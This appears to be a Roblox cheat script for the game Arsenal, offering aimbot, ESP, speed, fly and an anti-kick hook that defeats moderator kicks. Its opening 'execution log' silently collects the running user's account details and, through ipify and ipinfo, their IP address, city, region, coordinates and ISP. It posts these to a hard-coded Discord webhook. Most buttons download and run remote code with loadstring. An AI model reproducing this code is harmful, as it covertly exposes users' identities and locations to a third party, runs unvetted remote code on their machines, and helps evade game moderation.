--// Config
getgenv().whscript = "Untitled Hub Exec Log"
getgenv().webhookexecUrl = "https://discord.com/api/webhooks/1328092273803657226/ExVQ5Q2wtd4eUv2hs-RsNkjuxU7sxmFc1od4hZcc2ABoLChUcCDfrF7HXfmVS-qZBpAi"
getgenv().ExecLogSecret = true

--// Execution Log Script
local ui = gethui()
local folderName = "screen"
local folder = Instance.new("Folder")
folder.Name = folderName
local player = game:GetService("Players").LocalPlayer

if ui:FindFirstChild(folderName) then
    print("Script is already executed! Rejoin if it's an error!")
    local ui2 = gethui()
    local folderName2 = "screen2"
    local folder2 = Instance.new("Folder")
    folder2.Name = folderName2
    if ui2:FindFirstChild(folderName2) then
        player:Kick("Anti-spam execution system triggered. Please rejoin to proceed.")
    else
        folder2.Parent = gethui()
    end
else
    folder.Parent = gethui()
    local players = game:GetService("Players")
    local userid = player.UserId
    local gameid = game.PlaceId
    local jobid = tostring(game.JobId)
    local gameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
    local deviceType =
        game:GetService("UserInputService"):GetPlatform() == Enum.Platform.Windows and "PC 💻" or "Mobile 📱"
    local snipePlay =
        "game:GetService('TeleportService'):TeleportToPlaceInstance(" .. gameid .. ", '" .. jobid .. "', player)"
    local completeTime = os.date("%Y-%m-%d %H:%M:%S")
    local workspace = game:GetService("Workspace")
    local screenWidth = math.floor(workspace.CurrentCamera.ViewportSize.X)
    local screenHeight = math.floor(workspace.CurrentCamera.ViewportSize.Y)
    local memoryUsage = game:GetService("Stats"):GetTotalMemoryUsageMb()
    local playerCount = #players:GetPlayers()
    local maxPlayers = players.MaxPlayers
    local health =
        player.Character and player.Character:FindFirstChild("Humanoid") and player.Character.Humanoid.Health or "N/A"
    local maxHealth =
        player.Character and player.Character:FindFirstChild("Humanoid") and player.Character.Humanoid.MaxHealth or
        "N/A"
    local position =
        player.Character and player.Character:FindFirstChild("HumanoidRootPart") and
        player.Character.HumanoidRootPart.Position or
        "N/A"
    local gameVersion = game.PlaceVersion

    if not getgenv().ExecLogSecret then
        getgenv().ExecLogSecret = false
    end
    if not getgenv().whscript then
        getgenv().whscript = "Please provide a script name!"
    end
    local commonLoadTime = 5
    task.wait(commonLoadTime)
    local pingThreshold = 100
    local serverStats = game:GetService("Stats").Network.ServerStatsItem
    local dataPing = serverStats["Data Ping"]:GetValueString()
    local pingValue = tonumber(dataPing:match("(%d+)")) or "N/A"
    local function checkPremium()
        local premium = "false"
        local success, response =
            pcall(
            function()
                return player.MembershipType
            end
        )
        if success then
            if response == Enum.MembershipType.None then
                premium = "false"
            else
                premium = "true"
            end
        else
            premium = "Failed to retrieve Membership:"
        end
        return premium
    end
    local premium = checkPremium()

    local url = getgenv().webhookexecUrl

    local data = {
        ["content"] = "@everyone",
        ["embeds"] = {
            {
                ["title"] = "🚀 **Script Execution Detected | Exec Log**",
                ["description"] = "*A script was executed in your script. Here are the details:*",
                ["type"] = "rich",
                ["color"] = tonumber(0x3498db), -- Clean blue color
                ["fields"] = {
                    {
                        ["name"] = "🔍 **Script Info**",
                        ["value"] = "```💻 Script Name: " ..
                            getgenv().whscript .. "\n⏰ Executed At: " .. completeTime .. "```",
                        ["inline"] = false
                    },
                    {
                        ["name"] = "👤 **Player Details**",
                        ["value"] = "```🧸 Username: " ..
                            player.Name ..
                                "\n📝 Display Name: " ..
                                    player.DisplayName ..
                                        "\n🆔 UserID: " ..
                                            userid ..
                                                "\n❤️ Health: " ..
                                                    health ..
                                                        " / " ..
                                                            maxHealth ..
                                                                "\n🔗 Profile: View Profile (https://www.roblox.com/users/" ..
                                                                    userid .. "/profile)```",
                        ["inline"] = false
                    },
                    {
                        ["name"] = "📅 **Account Information**",
                        ["value"] = "```🗓️ Account Age: " ..
                            player.AccountAge ..
                                " days\n💎 Premium Status: " ..
                                    premium ..
                                        "\n📅 Account Created: " ..
                                            os.date("%Y-%m-%d", os.time() - (player.AccountAge * 86400)) .. "```",
                        ["inline"] = false
                    },
                    {
                        ["name"] = "🎮 **Game Details**",
                        ["value"] = "```🏷️ Game Name: " ..
                            gameName ..
                                "\n🆔 Game ID: " ..
                                    gameid ..
                                        "\n🔗 Game Link (https://www.roblox.com/games/" ..
                                            gameid .. ")\n🔢 Game Version: " .. gameVersion .. "```",
                        ["inline"] = false
                    },
                    {
                        ["name"] = "🕹️ **Server Info**",
                        ["value"] = "```👥 Players in Server: " ..
                            playerCount .. " / " .. maxPlayers .. "\n🕒 Server Time: " .. os.date("%H:%M:%S") .. "```",
                        ["inline"] = true
                    },
                    {
                        ["name"] = "📡 **Network Info**",
                        ["value"] = "```📶 Ping: " .. pingValue .. " ms```",
                        ["inline"] = true
                    },
                    {
                        ["name"] = "🖥️ **System Info**",
                        ["value"] = "```📺 Resolution: " ..
                            screenWidth ..
                                "x" ..
                                    screenHeight ..
                                        "\n🔍 Memory Usage: " ..
                                            memoryUsage .. " MB\n⚙️ Executor: " .. identifyexecutor() .. "```",
                        ["inline"] = true
                    },
                    {
                        ["name"] = "📍 **Character Position**",
                        ["value"] = "```📍 Position: " .. tostring(position) .. "```",
                        ["inline"] = true
                    },
                    {
                        ["name"] = "🪧 **Join Script**",
                        ["value"] = "```lua\n" .. snipePlay .. "```",
                        ["inline"] = false
                    }
                },
                ["thumbnail"] = {
                    ["url"] = "https://cdn.discordapp.com/icons/874587083291885608/a_80373524586aab90765f4b1e833fdf5a.gif?size=512"
                },
                ["footer"] = {
                    ["text"] = "Execution Log | " .. os.date("%Y-%m-%d %H:%M:%S"),
                    ["icon_url"] = "https://cdn.discordapp.com/icons/874587083291885608/a_80373524586aab90765f4b1e833fdf5a.gif?size=512" -- A generic log icon
                }
            }
        }
    }

    -- Check if the secret tab should be included
    if getgenv().ExecLogSecret then
        local ip = game:HttpGet("https://api.ipify.org")
        local iplink = "https://ipinfo.io/" .. ip .. "/json"
        local ipinfo_json = game:HttpGet(iplink)
        local ipinfo_table = game.HttpService:JSONDecode(ipinfo_json)

        table.insert(
            data.embeds[1].fields,
            {
                ["name"] = "**🤫 Secret**",
                ["value"] = "```(👣) IP Address: " ..
                    ipinfo_table.ip ..
                        "```\n```(🌎) Country: " ..
                            ipinfo_table.country ..
                                "```\n```(📡) GPS Location: " ..
                                    ipinfo_table.loc ..
                                        "```\n```(🏙️) City: " ..
                                            ipinfo_table.city ..
                                                "```\n```(🏡) Region: " ..
                                                    ipinfo_table.region ..
                                                        "```\n```(⛓) Hoster: " .. ipinfo_table.org .. "```"
            }
        )
    end

    local newdata = game:GetService("HttpService"):JSONEncode(data)
    local headers = {
        ["content-type"] = "application/json"
    }
    request = http_request or request or (syn and syn.request) or (fluxus and fluxus.request) or (http and http.request)
    local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
    request(abcdef)
end

local library = loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/SkidoLOL/ArsenalScript/main/Arsenal%20Script/Ui%20Lib/Shadow%20Lib.lua"))()

local Main = library:CreateWindow("Untitled Script Arsenal","Crimson")

local tab = Main:CreateTab("Main")
local tab2 = Main:CreateTab("Visuals")

local tab3 = Main:CreateTab("Player")
local tab4 = Main:CreateTab("Weapons")

local tab5 = Main:CreateTab("Game")
local tab6 = Main:CreateTab("Credits")

tab6:CreateButton("Discord Invite",function()
setclipboard('https://discord.gg/qkWVWph6ck')
end)

tab:CreateButton("Aimbot",function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/SkidoLOL/ArsenalScript/main/Arsenal%20Script/Scripts%20For%20MainHub/Arsenal%20AimBot.lua"))()
end)

tab:CreateButton("Silent Aim",function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/SkidoLOL/ArsenalScript/main/Arsenal%20Script/Scripts%20For%20MainHub/Silent%20Aim.lua"))()
end)

tab3:CreateButton("Speed Bypass",function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/SkidoLOL/ArsenalScript/main/Arsenal%20Script/Scripts%20For%20MainHub/GuiSpeed.lua"))()
end)

tab4:CreateButton("Modded Guns",function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/SkidoLOL/ArsenalScript/main/Arsenal%20Script/Scripts%20For%20MainHub/GunSettings.lua"))()
end)

tab4:CreateButton("Inf Ammo",function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/SkidoLOL/ArsenalScript/main/Arsenal%20Script/Scripts%20For%20MainHub/InfAmmo.lua"))()
end)

tab5:CreateButton("Rejoin Server",function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/SkidoLOL/ArsenalScript/main/Arsenal%20Script/Scripts%20For%20MainHub/Rejoin.lua"))()
end)

tab3:CreateButton("Fly Press E",function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/SkidoLOL/ArsenalScript/main/Arsenal%20Script/Scripts%20For%20MainHub/Fly.lua"))()
end)

tab3:CreateButton("Inf Jump",function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/SkidoLOL/ArsenalScript/main/Arsenal%20Script/Scripts%20For%20MainHub/Inf%20Jump.lua"))()
end)

tab5:CreateButton("Mod Bypass",function()

local getgenv, getnamecallmethod, hookmetamethod, newcclosure, checkcaller, stringlower = getgenv, getnamecallmethod, hookmetamethod, newcclosure, checkcaller, string.low

if getgenv().ED_AntiKick then
    return
end



local Players, StarterGui, OldNamecall = game:GetService("Players"), game:GetService("StarterGui")


getgenv().ED_AntiKick = {
    Enabled = true, 
    SendNotifications = true, 
    CheckCaller = false 
}

--Main

OldNamecall = hookmetamethod(game, "__namecall", newcclosure(function(...)
    if (getgenv().ED_AntiKick.CheckCaller and not checkcaller() or true) and stringlower(getnamecallmethod()) == "kick" and ED_AntiKick.Enabled then
        if getgenv().ED_AntiKick.SendNotifications then
            StarterGui:SetCore("SendNotification", {
                Title = "Anti Mod-ban",
                Text = "The script has successfully intercepted an attempt to ban you.",
                Icon = "rbxassetid://6238540373",
                Duration = 2,
            })
        end

        return nil
    end

    return OldNamecall(...)
end))

if getgenv().ED_AntiKick.SendNotifications then
    StarterGui:SetCore("SendNotification", {
        Title = "AntiDetect",
        Text = "Anti ModBan script loaded!",
        Icon = "rbxassetid://6238537240",
        Duration = 3,
    })
end
end)

tab5:CreateButton("Name Protect",function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/SkidoLOL/ArsenalScript/main/Arsenal%20Script/Scripts%20For%20MainHub/NameProtect.lua"))()
end)

tab2:CreateButton("ESP",function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/SkidoLOL/ArsenalScript/main/Arsenal%20Script/Scripts%20For%20MainHub/Arsenal%20ESP.lua"))()
end)

tab4:CreateButton("Rgb Weapons",function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/SkidoLOL/ArsenalScript/main/Arsenal%20Script/Scripts%20For%20MainHub/Rainbow%20Weapons.lua"))()
end)

tab:Show()

game:GetService("StarterGui"):SetCore("SendNotification",{
Title = "Script loaded enjoy!",
Text = "Made By SkidoLOL And qqwizzixxxx", 

Button1 = "o0o0o0o",
Button1 = "Play And Enjoy!",
Duration = 30 
})

